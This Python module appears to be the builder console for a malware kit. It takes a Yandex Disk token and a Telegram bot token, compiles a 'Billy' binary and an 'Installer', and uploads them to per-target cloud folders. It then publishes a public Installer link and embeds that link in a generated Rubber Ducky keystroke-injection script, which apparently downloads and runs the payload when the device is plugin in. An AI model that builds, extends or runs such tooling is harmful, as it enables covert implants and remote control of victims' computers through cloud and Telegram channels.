import requests
import yadisk
import json
import os
from datetime import datetime
import subprocess
import shutil
import config
import constants


def get_branch_path(branch_name):
    return config.BillyHerrington_network_directory + branch_name + '/'


def save_network_token(network_token):
    with open(config.session_network_token_path, 'w') as file:
        file.write(network_token)


def get_network_token_for_file():
    if os.path.isfile(config.session_network_token_path):
        with open(config.session_network_token_path) as file:
            return file.read()
    return 0


def get_network_token(message=constants.default_get_network_token_message, error_message=constants.default_get_network_token_error_message, only_input=False):
    network_token = get_network_token_for_file()
    if not only_input and network_token and check_network_token(network_token):
        return network_token

    while True:
        network_token = input(message).strip()

        if check_network_token(network_token):
            save_network_token(network_token)
            print()
            return network_token

        message = error_message


def get_bot_token(message=constants.default_get_bot_token_message, error_message=constants.default_get_bot_token_error_message):
    while True:
        bot_token = input(message).strip()

        if check_bot_token(bot_token):
            return bot_token

        message = error_message


def get_telegram_id(message=constants.default_get_telegram_id_message, error_message=constants.default_get_telegram_id_error_message):
    while True:
        telegram_id = input(message).strip()

        if check_telegram_id(telegram_id):
            return telegram_id

        message = error_message


def get_new_branch_name(message, error_message, network_token):
    while True:
        branch_name = input(message).strip()

        if check_new_branch_name(network_token, branch_name):
            return branch_name

        message = error_message


def valid_dir_path(dir_path):
    if not dir_path[-1] == '/':
        dir_path += '/'
    return dir_path


def upload(network_token, path, network_path):
    client = yadisk.Client(token=network_token)

    with client:
        if client.is_file(network_path):
            client.remove(network_path)

        client.upload(path, network_path)


def upload_dir(network_token, dir_path, network_dir_path):
    dir_path = valid_dir_path(dir_path)
    network_dir_path = valid_dir_path(network_dir_path)

    client = yadisk.Client(token=network_token)

    if not os.path.isdir(dir_path):
        return 0

    stack = [(dir_path, network_dir_path)]
    with client:
        while True:
            if len(stack) == 0:
                return 1
            dir_path, network_dir_path = stack.pop()

            for upload_name in os.listdir(dir_path):
                upload_path = dir_path + upload_name
                network_path = network_dir_path + upload_name

                if os.path.isdir(upload_path):
                    stack.append((upload_path + '/', network_path + '/'))
                    client.mkdir(network_path)

                elif os.path.isfile(upload_path):
                    upload(network_token, upload_path, network_path)


def check_network_token(token):
    url = 'https://cloud-api.yandex.net/v1/disk'
    headers = {
        'Authorization': f'OAuth {token}'
    }

    try:
        response = requests.get(url, headers=headers)
        return response.status_code == 200
    except:
        return False


def check_bot_token(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    response = requests.get(url)
    data = response.json()
    return data.get("ok", False)


def check_new_branch_name(network_token, branch_name):
    if not (0 < len(branch_name) <= config.max_length_of_branch_name):
        return 0

    client = yadisk.Client(token=network_token)

    with client:
        if not client.is_dir(config.BillyHerrington_network_directory):
            return 1

        if not client.is_dir(get_branch_path(branch_name)):
            return 1
        return 0


def check_telegram_id(telegram_id):
    if telegram_id.isdigit() and int(telegram_id) > 0:
        return 1
    return 0


def rewrite_file(path, value):
    with open(path, 'w') as file:
        file.write(value)


def edit_sample(network_token, branch_name, telegram_id):
    rewrite_file(config.network_token_path,
                 config.network_token_value.format(network_token=network_token))

    rewrite_file(config.branch_name_path,
                 config.branch_name_value.format(branch_name=branch_name))

    rewrite_file(config.permissions_file_path,
                 config.permissions_file_value.format(telegram_id=telegram_id))


def restore_sample(network_token, branch_name, telegram_id):
    rewrite_file(config.network_token_path,
                 config.network_token_value.format(network_token=''))

    rewrite_file(config.branch_name_path,
                 config.branch_name_value.format(branch_name=''))

    rewrite_file(config.permissions_file_path,
                 config.permissions_file_value.format(telegram_id=''))


def create_branch_dir(network_token, branch_name):
    client = yadisk.Client(token=network_token)

    with client:
        if not client.is_dir(config.BillyHerrington_network_directory):
            client.mkdir(config.BillyHerrington_network_directory)

        if not client.is_dir(get_branch_path(branch_name)):
            client.mkdir(get_branch_path(branch_name))


def upload_sample(network_token, branch_name):
    branch_path = get_branch_path(branch_name)

    upload_dir(network_token, config.sample_dir_path, branch_path)


def edit_parser(network_token, branch_name, bot_token):
    client = yadisk.Client(token=network_token)

    network_parser_path = config.network_parser_path
    parser_path = config.parser_path

    with client:
        if client.is_file(network_parser_path):
            client.download(network_parser_path, parser_path)
        else:
            with open(parser_path, 'w') as file:
                file.write('{}')

        with open(parser_path) as file:
            parser = json.load(file)

        parser[branch_name] = {
            "root_path": get_branch_path(branch_name), "token": bot_token}

        with open(parser_path, 'w') as file:
            json.dump(parser, file)

        upload(network_token, parser_path, network_parser_path)

        os.remove(parser_path)


def get_compile_commands():
    with open(config.Billy_compile_command_path) as file:
        Billy_compile_command = file.read()

    with open(config.Installer_compile_command_path) as file:
        Installer_compile_command = file.read()
    return (Billy_compile_command, Installer_compile_command)


def compile():
    Billy_path = config.compile_dir_path + config.Billy_name
    Installer_path = config.compile_dir_path + config.Installer_name

    Billy_compile_command, Installer_compile_command = get_compile_commands()

    Billy_compile_result = subprocess.run(
        Billy_compile_command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, shell=1)
    Billy_compile_result_error = Billy_compile_result.stderr.decode(
        encoding='cp866')

    Installer_compile_result = subprocess.run(
        Installer_compile_command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, shell=1)
    Installer_compile_result_error = Installer_compile_result.stderr.decode(
        encoding='cp866')

    Billy_status = (not Billy_compile_result.returncode)

    Installer_status = (not Installer_compile_result.returncode)

    status = Billy_status and Installer_status

    if status:
        return (status, (Billy_path, Installer_path))
    elif not Billy_status:
        return (status, Billy_compile_result_error)
    elif not Installer_status:
        return (status, Installer_compile_result_error)


def change_Billy_compile_command(compile_command):
    with open(config.Billy_compile_command_path, 'w') as file:
        file.write(compile_command)


def change_Installer_compile_command(compile_command):
    with open(config.Installer_compile_command_path, 'w') as file:
        file.write(compile_command)


def upload_Billy_and_Installer(network_token, branch_name, Billy_path, Installer_path):
    network_Billy_path = get_branch_path(
        branch_name) + 'Billy/' + config.Billy_name
    network_Installer_path = get_branch_path(
        branch_name) + 'Installer/' + config.Installer_name

    upload(network_token, Billy_path, network_Billy_path)
    upload(network_token, Installer_path, network_Installer_path)


def delete_binary_files():
    compile_paths = ['dist', 'build', 'Billy.spec', 'Installer.spec']

    for path in compile_paths:
        if os.path.exists(path):
            if os.path.isdir(path):
                shutil.rmtree(path)

            if os.path.isfile(path):
                os.remove(path)


def public_Installer(network_token, branch_name):
    network_Installer_path = get_branch_path(
        branch_name) + 'Installer/' + config.Installer_name

    client = yadisk.Client(token=network_token)

    with client:
        client.publish(network_Installer_path)
        link = client.get_meta(network_Installer_path)

    return link['public_url']


def get_public_installer_link(network_token, branch_name):
    network_Installer_path = get_branch_path(
        branch_name) + 'Installer/' + config.Installer_name

    client = yadisk.Client(token=network_token)

    with client:
        link = client.get_meta(network_Installer_path)

        return link['public_url']


def create_rubber_ducky_script(branch_name, link):
    if not os.path.isdir(config.rubber_ducky_scripts_path):
        os.mkdir(config.rubber_ducky_scripts_path)

    rubber_ducky_script_path = config.rubber_ducky_script_path.format(
        branch_name=branch_name)

    with open(rubber_ducky_script_path, 'w') as file:
        file.write(config.rubber_ducky_script.format(link=link))

    return rubber_ducky_script_path


def delete_rubber_ducky_script(branch_name):
    rubber_ducky_script_path = config.rubber_ducky_script_path.format(
        branch_name=branch_name)

    if os.path.isfile(rubber_ducky_script_path):
        os.remove(rubber_ducky_script_path)


def check_branch(network_token, branch_name):
    client = yadisk.Client(token=network_token)

    with client:
        if not client.is_dir(config.BillyHerrington_network_directory + branch_name):
            return 0

        if not client.is_dir(valid_dir_path(config.BillyHerrington_network_directory + branch_name) + 'Billy'):
            return 0

        return 1


def get_branches(network_token):
    client = yadisk.Client(token=network_token)

    branch_names = list()

    with client:
        if not client.is_dir(config.BillyHerrington_network_directory):
            return 0

        for path in list(client.listdir(config.BillyHerrington_network_directory)):
            branch_name = path.name

            time_of_creating = datetime.strftime(
                path.created, '%d.%m.%Y %H:%M:%S')

            comment = get_comment(branch_name, network_token)

            if client.is_file(get_branch_path(branch_name) + 'Billy/' + config.Billy_windows_name):
                branch_os = 'Windows'
            elif client.is_file(get_branch_path(branch_name) + 'Billy/' + config.Billy_linux_name):
                branch_os = 'Linux  '
            else:
                continue

            branch_names.append(
                [branch_name, branch_os, time_of_creating, comment])

    return branch_names


def get_branch_for_list(branches, message=constants.default_get_branch_for_list_message, error_message=constants.default_get_branch_for_list_error_message):
    while True:
        number_of_branch = input(message).strip()

        if number_of_branch.isdigit() and 0 < int(number_of_branch) <= len(branches):
            return branches[int(number_of_branch) - 1][0]
        else:
            if constants.special_length_substitute in error_message:
                error_message = error_message.replace(
                    constants.special_length_substitute, len(branches))
            message = error_message


def delete_network_brunch(network_token, branch_name):
    client = yadisk.Client(token=network_token)

    with client:
        if client.is_dir(config.BillyHerrington_network_directory + branch_name):
            client.remove(config.BillyHerrington_network_directory +
                          branch_name, permanently=True)


def delete_brunch_from_parser(network_token, branch_name):
    client = yadisk.Client(token=network_token)

    with client:
        if client.is_file(config.network_parser_path):
            client.download(config.network_parser_path, config.parser_path)
        else:
            with open(config.parser_path, 'w') as file:
                file.write('{}')

        with open(config.parser_path) as file:
            parser = json.load(file)

        if branch_name in parser:
            del parser[branch_name]

        with open(config.parser_path, 'w') as file:
            json.dump(parser, file)

        if client.is_file(config.network_parser_path):
            client.remove(config.network_parser_path, permanently=True)

        client.upload(config.parser_path, config.network_parser_path)

        os.remove(config.parser_path)


def create_comment(comment, branch_name, network_token):
    client = yadisk.Client(token=network_token)

    with client:
        comment_network_path = config.comment_network_path.format(
            branch_name=branch_name)
        comment_path = config.comment_path

        with open(comment_path, 'w') as file:
            file.write(comment)

        client.upload(comment_path, comment_network_path, overwrite=1)

        os.remove(comment_path)


def get_comment(branch_name, network_token):
    client = yadisk.Client(token=network_token)

    with client:
        comment_network_path = config.comment_network_path.format(
            branch_name=branch_name)
        comment_path = config.comment_path

        if not client.is_file(comment_network_path):
            return ''

        client.download(comment_network_path, comment_path)

        with open(comment_path) as file:
            comment = file.read().strip()

        if comment != '':
            comment = '# ' + comment

        os.remove(comment_path)

        return comment
